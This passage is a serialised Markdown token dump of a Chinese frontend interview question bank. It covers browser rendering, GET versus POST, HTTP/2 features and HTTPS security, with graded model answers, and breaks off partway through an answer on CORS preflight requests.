DOM元素对应几个可见对象，它们一般是一些具有复杂结构的元素，无法用一个矩形来描述。","tokens":[{"type":"text","raw":"**1：** 根据 DOM 树和 CSSOM 规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象是一个包含有颜色和大小等属性的矩形，渲染对象和 DOM 元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。还有一些 DOM元素对应几个可见对象，它们一般是一些具有复杂结构的元素，无法用一个矩形来描述。","text":"**1：** 根据 DOM 树和 CSSOM 规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象是一个包含有颜色和大小等属性的矩形，渲染对象和 DOM 元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。还有一些 DOM元素对应几个可见对象，它们一般是一些具有复杂结构的元素，无法用一个矩形来描述。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 根据 DOM 树和 CSSOM 规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象是一个包含有颜色和大小等属性的矩形，渲染对象和 DOM 元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。还有一些 DOM元素对应几个可见对象，它们一般是一些具有复杂结构的元素，无法用一个矩形来描述。","text":" 根据 DOM 树和 CSSOM 规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象是一个包含有颜色和大小等属性的矩形，渲染对象和 DOM 元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。还有一些 DOM元素对应几个可见对象，它们一般是一些具有复杂结构的元素，无法用一个矩形来描述。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。\\n","task":false,"loose":false,"text":"**1：** 当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。","tokens":[{"type":"text","raw":"**1：** 当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。","text":"**1：** 当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。","text":" 当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。","task":false,"loose":false,"text":"**1：** 布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。","tokens":[{"type":"text","raw":"**1：** 布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。","text":"**1：** 布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。","text":" 布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## GET和POST有什么区别？\\n\\n","depth":2,"text":"GET和POST有什么区别？","tokens":[{"type":"text","raw":"GET和POST有什么区别？","text":"GET和POST有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- GET请求的请求参数会附加在URL之后，参数之间使用\\"&\\"连接，多个参数将会造成URL长度增加。而POST请求的请求参数则包含在请求体中，不会在URL中显示。\\n- 由于GET请求的参数附加在URL之后，因此其请求长度受限于浏览器对URL长度的限制（通常浏览器对URL的长度有限制，而服务器对URL的长度限制更为宽松）。而POST请求则没有这个问题，请求参数包含在请求体中，因此可以传输大量数据。\\n- GET请求的参数会暴露在URL中，因此不能用于传输敏感信息，如密码等。而POST请求的参数在请求体中，不会在URL中显示，相对更加安全。然而，这并不意味着POST请求就一定比GET请求更安全，因为安全性还需要依赖于其他因素，如SSL/TLS加密等。\\n- GET请求是幂等的，即多次执行同一GET请求，服务器将返回相同的结果。而POST请求则不是幂等的，因为每次提交都会创建新的资源。\\n- GET请求可以被缓存，而POST请求则不会，除非在响应头中包含适当的Cache-Control或Expires字段。\\n- GET请求可以被浏览器缓存，因此可以通过点击后退按钮或刷新按钮来重复执行。而POST请求则不会，因为这些操作对POST请求没有实际意义。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- GET请求的请求参数会附加在URL之后，参数之间使用\\"&\\"连接，多个参数将会造成URL长度增加。而POST请求的请求参数则包含在请求体中，不会在URL中显示。\\n","task":false,"loose":false,"text":"GET请求的请求参数会附加在URL之后，参数之间使用\\"&\\"连接，多个参数将会造成URL长度增加。而POST请求的请求参数则包含在请求体中，不会在URL中显示。","tokens":[{"type":"text","raw":"GET请求的请求参数会附加在URL之后，参数之间使用\\"&\\"连接，多个参数将会造成URL长度增加。而POST请求的请求参数则包含在请求体中，不会在URL中显示。","text":"GET请求的请求参数会附加在URL之后，参数之间使用\\"&\\"连接，多个参数将会造成URL长度增加。而POST请求的请求参数则包含在请求体中，不会在URL中显示。","tokens":[{"type":"text","raw":"GET请求的请求参数会附加在URL之后，参数之间使用\\"&\\"连接，多个参数将会造成URL长度增加。而POST请求的请求参数则包含在请求体中，不会在URL中显示。","text":"GET请求的请求参数会附加在URL之后，参数之间使用\\"&\\"连接，多个参数将会造成URL长度增加。而POST请求的请求参数则包含在请求体中，不会在URL中显示。","escaped":false}]}]},{"type":"list_item","raw":"- 由于GET请求的参数附加在URL之后，因此其请求长度受限于浏览器对URL长度的限制（通常浏览器对URL的长度有限制，而服务器对URL的长度限制更为宽松）。而POST请求则没有这个问题，请求参数包含在请求体中，因此可以传输大量数据。\\n","task":false,"loose":false,"text":"由于GET请求的参数附加在URL之后，因此其请求长度受限于浏览器对URL长度的限制（通常浏览器对URL的长度有限制，而服务器对URL的长度限制更为宽松）。而POST请求则没有这个问题，请求参数包含在请求体中，因此可以传输大量数据。","tokens":[{"type":"text","raw":"由于GET请求的参数附加在URL之后，因此其请求长度受限于浏览器对URL长度的限制（通常浏览器对URL的长度有限制，而服务器对URL的长度限制更为宽松）。而POST请求则没有这个问题，请求参数包含在请求体中，因此可以传输大量数据。","text":"由于GET请求的参数附加在URL之后，因此其请求长度受限于浏览器对URL长度的限制（通常浏览器对URL的长度有限制，而服务器对URL的长度限制更为宽松）。而POST请求则没有这个问题，请求参数包含在请求体中，因此可以传输大量数据。","tokens":[{"type":"text","raw":"由于GET请求的参数附加在URL之后，因此其请求长度受限于浏览器对URL长度的限制（通常浏览器对URL的长度有限制，而服务器对URL的长度限制更为宽松）。而POST请求则没有这个问题，请求参数包含在请求体中，因此可以传输大量数据。","text":"由于GET请求的参数附加在URL之后，因此其请求长度受限于浏览器对URL长度的限制（通常浏览器对URL的长度有限制，而服务器对URL的长度限制更为宽松）。而POST请求则没有这个问题，请求参数包含在请求体中，因此可以传输大量数据。","escaped":false}]}]},{"type":"list_item","raw":"- GET请求的参数会暴露在URL中，因此不能用于传输敏感信息，如密码等。而POST请求的参数在请求体中，不会在URL中显示，相对更加安全。然而，这并不意味着POST请求就一定比GET请求更安全，因为安全性还需要依赖于其他因素，如SSL/TLS加密等。\\n","task":false,"loose":false,"text":"GET请求的参数会暴露在URL中，因此不能用于传输敏感信息，如密码等。而POST请求的参数在请求体中，不会在URL中显示，相对更加安全。然而，这并不意味着POST请求就一定比GET请求更安全，因为安全性还需要依赖于其他因素，如SSL/TLS加密等。","tokens":[{"type":"text","raw":"GET请求的参数会暴露在URL中，因此不能用于传输敏感信息，如密码等。而POST请求的参数在请求体中，不会在URL中显示，相对更加安全。然而，这并不意味着POST请求就一定比GET请求更安全，因为安全性还需要依赖于其他因素，如SSL/TLS加密等。","text":"GET请求的参数会暴露在URL中，因此不能用于传输敏感信息，如密码等。而POST请求的参数在请求体中，不会在URL中显示，相对更加安全。然而，这并不意味着POST请求就一定比GET请求更安全，因为安全性还需要依赖于其他因素，如SSL/TLS加密等。","tokens":[{"type":"text","raw":"GET请求的参数会暴露在URL中，因此不能用于传输敏感信息，如密码等。而POST请求的参数在请求体中，不会在URL中显示，相对更加安全。然而，这并不意味着POST请求就一定比GET请求更安全，因为安全性还需要依赖于其他因素，如SSL/TLS加密等。","text":"GET请求的参数会暴露在URL中，因此不能用于传输敏感信息，如密码等。而POST请求的参数在请求体中，不会在URL中显示，相对更加安全。然而，这并不意味着POST请求就一定比GET请求更安全，因为安全性还需要依赖于其他因素，如SSL/TLS加密等。","escaped":false}]}]},{"type":"list_item","raw":"- GET请求是幂等的，即多次执行同一GET请求，服务器将返回相同的结果。而POST请求则不是幂等的，因为每次提交都会创建新的资源。\\n","task":false,"loose":false,"text":"GET请求是幂等的，即多次执行同一GET请求，服务器将返回相同的结果。而POST请求则不是幂等的，因为每次提交都会创建新的资源。","tokens":[{"type":"text","raw":"GET请求是幂等的，即多次执行同一GET请求，服务器将返回相同的结果。而POST请求则不是幂等的，因为每次提交都会创建新的资源。","text":"GET请求是幂等的，即多次执行同一GET请求，服务器将返回相同的结果。而POST请求则不是幂等的，因为每次提交都会创建新的资源。","tokens":[{"type":"text","raw":"GET请求是幂等的，即多次执行同一GET请求，服务器将返回相同的结果。而POST请求则不是幂等的，因为每次提交都会创建新的资源。","text":"GET请求是幂等的，即多次执行同一GET请求，服务器将返回相同的结果。而POST请求则不是幂等的，因为每次提交都会创建新的资源。","escaped":false}]}]},{"type":"list_item","raw":"- GET请求可以被缓存，而POST请求则不会，除非在响应头中包含适当的Cache-Control或Expires字段。\\n","task":false,"loose":false,"text":"GET请求可以被缓存，而POST请求则不会，除非在响应头中包含适当的Cache-Control或Expires字段。","tokens":[{"type":"text","raw":"GET请求可以被缓存，而POST请求则不会，除非在响应头中包含适当的Cache-Control或Expires字段。","text":"GET请求可以被缓存，而POST请求则不会，除非在响应头中包含适当的Cache-Control或Expires字段。","tokens":[{"type":"text","raw":"GET请求可以被缓存，而POST请求则不会，除非在响应头中包含适当的Cache-Control或Expires字段。","text":"GET请求可以被缓存，而POST请求则不会，除非在响应头中包含适当的Cache-Control或Expires字段。","escaped":false}]}]},{"type":"list_item","raw":"- GET请求可以被浏览器缓存，因此可以通过点击后退按钮或刷新按钮来重复执行。而POST请求则不会，因为这些操作对POST请求没有实际意义。","task":false,"loose":false,"text":"GET请求可以被浏览器缓存，因此可以通过点击后退按钮或刷新按钮来重复执行。而POST请求则不会，因为这些操作对POST请求没有实际意义。","tokens":[{"type":"text","raw":"GET请求可以被浏览器缓存，因此可以通过点击后退按钮或刷新按钮来重复执行。而POST请求则不会，因为这些操作对POST请求没有实际意义。","text":"GET请求可以被浏览器缓存，因此可以通过点击后退按钮或刷新按钮来重复执行。而POST请求则不会，因为这些操作对POST请求没有实际意义。","tokens":[{"type":"text","raw":"GET请求可以被浏览器缓存，因此可以通过点击后退按钮或刷新按钮来重复执行。而POST请求则不会，因为这些操作对POST请求没有实际意义。","text":"GET请求可以被浏览器缓存，因此可以通过点击后退按钮或刷新按钮来重复执行。而POST请求则不会，因为这些操作对POST请求没有实际意义。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## HTTP2相对于HTTP1.x有什么优势和特点？\\n\\n","depth":2,"text":"HTTP2相对于HTTP1.x有什么优势和特点？","tokens":[{"type":"text","raw":"HTTP2相对于HTTP1.x有什么优势和特点？","text":"HTTP2相对于HTTP1.x有什么优势和特点？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- HTTP/2不再使用文本格式来传输数据，而是将所有传输的信息分割为更小的消息和帧（frame），并以二进制格式进行编码。这有助于更高效地解析HTTP消息，并减少了解析错误的可能性。\\n- HTTP/2引入了多路复用技术，允许在单个TCP连接中并行处理多个请求和响应。这消除了HTTP/1.x中的队头阻塞问题，极大地提高了网络性能和资源利用率。\\n- HTTP/2使用了头部压缩技术，通过共享头部信息，可以显著减少传输的数据量。这有助于减少延迟和网络带宽的消耗，特别是在传输大量小请求时效果更为显著。\\n- HTTP/2允许服务器主动向客户端推送资源，而无需等待客户端的请求。这有助于减少往返时间，并提高网页加载速度。\\n- HTTP/2通过流控制、消息控制和窗口控制等机制，实现了对流量的精细控制，有助于防止网络拥塞和资源浪费。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- HTTP/2不再使用文本格式来传输数据，而是将所有传输的信息分割为更小的消息和帧（frame），并以二进制格式进行编码。这有助于更高效地解析HTTP消息，并减少了解析错误的可能性。\\n","task":false,"loose":false,"text":"HTTP/2不再使用文本格式来传输数据，而是将所有传输的信息分割为更小的消息和帧（frame），并以二进制格式进行编码。这有助于更高效地解析HTTP消息，并减少了解析错误的可能性。","tokens":[{"type":"text","raw":"HTTP/2不再使用文本格式来传输数据，而是将所有传输的信息分割为更小的消息和帧（frame），并以二进制格式进行编码。这有助于更高效地解析HTTP消息，并减少了解析错误的可能性。","text":"HTTP/2不再使用文本格式来传输数据，而是将所有传输的信息分割为更小的消息和帧（frame），并以二进制格式进行编码。这有助于更高效地解析HTTP消息，并减少了解析错误的可能性。","tokens":[{"type":"text","raw":"HTTP/2不再使用文本格式来传输数据，而是将所有传输的信息分割为更小的消息和帧（frame），并以二进制格式进行编码。这有助于更高效地解析HTTP消息，并减少了解析错误的可能性。","text":"HTTP/2不再使用文本格式来传输数据，而是将所有传输的信息分割为更小的消息和帧（frame），并以二进制格式进行编码。这有助于更高效地解析HTTP消息，并减少了解析错误的可能性。","escaped":false}]}]},{"type":"list_item","raw":"- HTTP/2引入了多路复用技术，允许在单个TCP连接中并行处理多个请求和响应。这消除了HTTP/1.x中的队头阻塞问题，极大地提高了网络性能和资源利用率。\\n","task":false,"loose":false,"text":"HTTP/2引入了多路复用技术，允许在单个TCP连接中并行处理多个请求和响应。这消除了HTTP/1.x中的队头阻塞问题，极大地提高了网络性能和资源利用率。","tokens":[{"type":"text","raw":"HTTP/2引入了多路复用技术，允许在单个TCP连接中并行处理多个请求和响应。这消除了HTTP/1.x中的队头阻塞问题，极大地提高了网络性能和资源利用率。","text":"HTTP/2引入了多路复用技术，允许在单个TCP连接中并行处理多个请求和响应。这消除了HTTP/1.x中的队头阻塞问题，极大地提高了网络性能和资源利用率。","tokens":[{"type":"text","raw":"HTTP/2引入了多路复用技术，允许在单个TCP连接中并行处理多个请求和响应。这消除了HTTP/1.x中的队头阻塞问题，极大地提高了网络性能和资源利用率。","text":"HTTP/2引入了多路复用技术，允许在单个TCP连接中并行处理多个请求和响应。这消除了HTTP/1.x中的队头阻塞问题，极大地提高了网络性能和资源利用率。","escaped":false}]}]},{"type":"list_item","raw":"- HTTP/2使用了头部压缩技术，通过共享头部信息，可以显著减少传输的数据量。这有助于减少延迟和网络带宽的消耗，特别是在传输大量小请求时效果更为显著。\\n","task":false,"loose":false,"text":"HTTP/2使用了头部压缩技术，通过共享头部信息，可以显著减少传输的数据量。这有助于减少延迟和网络带宽的消耗，特别是在传输大量小请求时效果更为显著。","tokens":[{"type":"text","raw":"HTTP/2使用了头部压缩技术，通过共享头部信息，可以显著减少传输的数据量。这有助于减少延迟和网络带宽的消耗，特别是在传输大量小请求时效果更为显著。","text":"HTTP/2使用了头部压缩技术，通过共享头部信息，可以显著减少传输的数据量。这有助于减少延迟和网络带宽的消耗，特别是在传输大量小请求时效果更为显著。","tokens":[{"type":"text","raw":"HTTP/2使用了头部压缩技术，通过共享头部信息，可以显著减少传输的数据量。这有助于减少延迟和网络带宽的消耗，特别是在传输大量小请求时效果更为显著。","text":"HTTP/2使用了头部压缩技术，通过共享头部信息，可以显著减少传输的数据量。这有助于减少延迟和网络带宽的消耗，特别是在传输大量小请求时效果更为显著。","escaped":false}]}]},{"type":"list_item","raw":"- HTTP/2允许服务器主动向客户端推送资源，而无需等待客户端的请求。这有助于减少往返时间，并提高网页加载速度。\\n","task":false,"loose":false,"text":"HTTP/2允许服务器主动向客户端推送资源，而无需等待客户端的请求。这有助于减少往返时间，并提高网页加载速度。","tokens":[{"type":"text","raw":"HTTP/2允许服务器主动向客户端推送资源，而无需等待客户端的请求。这有助于减少往返时间，并提高网页加载速度。","text":"HTTP/2允许服务器主动向客户端推送资源，而无需等待客户端的请求。这有助于减少往返时间，并提高网页加载速度。","tokens":[{"type":"text","raw":"HTTP/2允许服务器主动向客户端推送资源，而无需等待客户端的请求。这有助于减少往返时间，并提高网页加载速度。","text":"HTTP/2允许服务器主动向客户端推送资源，而无需等待客户端的请求。这有助于减少往返时间，并提高网页加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- HTTP/2通过流控制、消息控制和窗口控制等机制，实现了对流量的精细控制，有助于防止网络拥塞和资源浪费。","task":false,"loose":false,"text":"HTTP/2通过流控制、消息控制和窗口控制等机制，实现了对流量的精细控制，有助于防止网络拥塞和资源浪费。","tokens":[{"type":"text","raw":"HTTP/2通过流控制、消息控制和窗口控制等机制，实现了对流量的精细控制，有助于防止网络拥塞和资源浪费。","text":"HTTP/2通过流控制、消息控制和窗口控制等机制，实现了对流量的精细控制，有助于防止网络拥塞和资源浪费。","tokens":[{"type":"text","raw":"HTTP/2通过流控制、消息控制和窗口控制等机制，实现了对流量的精细控制，有助于防止网络拥塞和资源浪费。","text":"HTTP/2通过流控制、消息控制和窗口控制等机制，实现了对流量的精细控制，有助于防止网络拥塞和资源浪费。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## https是怎么保证安全的，为什么比http安全？\\n\\n","depth":2,"text":"https是怎么保证安全的，为什么比http安全？","tokens":[{"type":"text","raw":"https是怎么保证安全的，为什么比http安全？","text":"https是怎么保证安全的，为什么比http安全？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- HTTPS使用SSL/TLS协议对HTTP报文进行加密，使得敏感数据在网络传输过程中不容易被窃听和篡改。这种加密过程结合了对称加密和非对称加密，确保数据的保密性和完整性。\\n- HTTPS通过数字证书进行身份验证，确保通信双方的真实性。在建立HTTPS连接时，服务器会提供数字证书来证明自己的身份。如果验证通过，客户端就可以信任服务器，并继续与其进行安全的数据传输。这有效防止了被恶意伪装的服务器攻击。\\n- 在传输数据之前，HTTPS会对数据进行加密，并使用消息摘要（hash）算法生成一个摘要值。在数据到达接收端后，接收端会使用相同的算法对接收到的数据进行摘要计算，并与发送端的摘要值进行比较。如果两者一致，说明数据在传输过程中没有被篡改。如果不一致，通信双方应重新进行验证或中断连接。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- HTTPS使用SSL/TLS协议对HTTP报文进行加密，使得敏感数据在网络传输过程中不容易被窃听和篡改。这种加密过程结合了对称加密和非对称加密，确保数据的保密性和完整性。\\n","task":false,"loose":false,"text":"HTTPS使用SSL/TLS协议对HTTP报文进行加密，使得敏感数据在网络传输过程中不容易被窃听和篡改。这种加密过程结合了对称加密和非对称加密，确保数据的保密性和完整性。","tokens":[{"type":"text","raw":"HTTPS使用SSL/TLS协议对HTTP报文进行加密，使得敏感数据在网络传输过程中不容易被窃听和篡改。这种加密过程结合了对称加密和非对称加密，确保数据的保密性和完整性。","text":"HTTPS使用SSL/TLS协议对HTTP报文进行加密，使得敏感数据在网络传输过程中不容易被窃听和篡改。这种加密过程结合了对称加密和非对称加密，确保数据的保密性和完整性。","tokens":[{"type":"text","raw":"HTTPS使用SSL/TLS协议对HTTP报文进行加密，使得敏感数据在网络传输过程中不容易被窃听和篡改。这种加密过程结合了对称加密和非对称加密，确保数据的保密性和完整性。","text":"HTTPS使用SSL/TLS协议对HTTP报文进行加密，使得敏感数据在网络传输过程中不容易被窃听和篡改。这种加密过程结合了对称加密和非对称加密，确保数据的保密性和完整性。","escaped":false}]}]},{"type":"list_item","raw":"- HTTPS通过数字证书进行身份验证，确保通信双方的真实性。在建立HTTPS连接时，服务器会提供数字证书来证明自己的身份。如果验证通过，客户端就可以信任服务器，并继续与其进行安全的数据传输。这有效防止了被恶意伪装的服务器攻击。\\n","task":false,"loose":false,"text":"HTTPS通过数字证书进行身份验证，确保通信双方的真实性。在建立HTTPS连接时，服务器会提供数字证书来证明自己的身份。如果验证通过，客户端就可以信任服务器，并继续与其进行安全的数据传输。这有效防止了被恶意伪装的服务器攻击。","tokens":[{"type":"text","raw":"HTTPS通过数字证书进行身份验证，确保通信双方的真实性。在建立HTTPS连接时，服务器会提供数字证书来证明自己的身份。如果验证通过，客户端就可以信任服务器，并继续与其进行安全的数据传输。这有效防止了被恶意伪装的服务器攻击。","text":"HTTPS通过数字证书进行身份验证，确保通信双方的真实性。在建立HTTPS连接时，服务器会提供数字证书来证明自己的身份。如果验证通过，客户端就可以信任服务器，并继续与其进行安全的数据传输。这有效防止了被恶意伪装的服务器攻击。","tokens":[{"type":"text","raw":"HTTPS通过数字证书进行身份验证，确保通信双方的真实性。在建立HTTPS连接时，服务器会提供数字证书来证明自己的身份。如果验证通过，客户端就可以信任服务器，并继续与其进行安全的数据传输。这有效防止了被恶意伪装的服务器攻击。","text":"HTTPS通过数字证书进行身份验证，确保通信双方的真实性。在建立HTTPS连接时，服务器会提供数字证书来证明自己的身份。如果验证通过，客户端就可以信任服务器，并继续与其进行安全的数据传输。这有效防止了被恶意伪装的服务器攻击。","escaped":false}]}]},{"type":"list_item","raw":"- 在传输数据之前，HTTPS会对数据进行加密，并使用消息摘要（hash）算法生成一个摘要值。在数据到达接收端后，接收端会使用相同的算法对接收到的数据进行摘要计算，并与发送端的摘要值进行比较。如果两者一致，说明数据在传输过程中没有被篡改。如果不一致，通信双方应重新进行验证或中断连接。","task":false,"loose":false,"text":"在传输数据之前，HTTPS会对数据进行加密，并使用消息摘要（hash）算法生成一个摘要值。在数据到达接收端后，接收端会使用相同的算法对接收到的数据进行摘要计算，并与发送端的摘要值进行比较。如果两者一致，说明数据在传输过程中没有被篡改。如果不一致，通信双方应重新进行验证或中断连接。","tokens":[{"type":"text","raw":"在传输数据之前，HTTPS会对数据进行加密，并使用消息摘要（hash）算法生成一个摘要值。在数据到达接收端后，接收端会使用相同的算法对接收到的数据进行摘要计算，并与发送端的摘要值进行比较。如果两者一致，说明数据在传输过程中没有被篡改。如果不一致，通信双方应重新进行验证或中断连接。","text":"在传输数据之前，HTTPS会对数据进行加密，并使用消息摘要（hash）算法生成一个摘要值。在数据到达接收端后，接收端会使用相同的算法对接收到的数据进行摘要计算，并与发送端的摘要值进行比较。如果两者一致，说明数据在传输过程中没有被篡改。如果不一致，通信双方应重新进行验证或中断连接。","tokens":[{"type":"text","raw":"在传输数据之前，HTTPS会对数据进行加密，并使用消息摘要（hash）算法生成一个摘要值。在数据到达接收端后，接收端会使用相同的算法对接收到的数据进行摘要计算，并与发送端的摘要值进行比较。如果两者一致，说明数据在传输过程中没有被篡改。如果不一致，通信双方应重新进行验证或中断连接。","text":"在传输数据之前，HTTPS会对数据进行加密，并使用消息摘要（hash）算法生成一个摘要值。在数据到达接收端后，接收端会使用相同的算法对接收到的数据进行摘要计算，并与发送端的摘要值进行比较。如果两者一致，说明数据在传输过程中没有被篡改。如果不一致，通信双方应重新进行验证或中断连接。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## post请求为什么会多发送一次option请求？\\n\\n","depth":2,"text":"post请求为什么会多发送一次option请求？","tokens":[{"type":"text","raw":"post请求为什么会多发送一次option请求？","text":"post请求为什么会多发送一次option请求？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- POST 请求前发送的 OPTIONS 请求实际上是 HTTP 的一种特性，称为“预检请求”（Preflight request）。这主要发生在跨域请求（CORS, Cross-Origin Resource 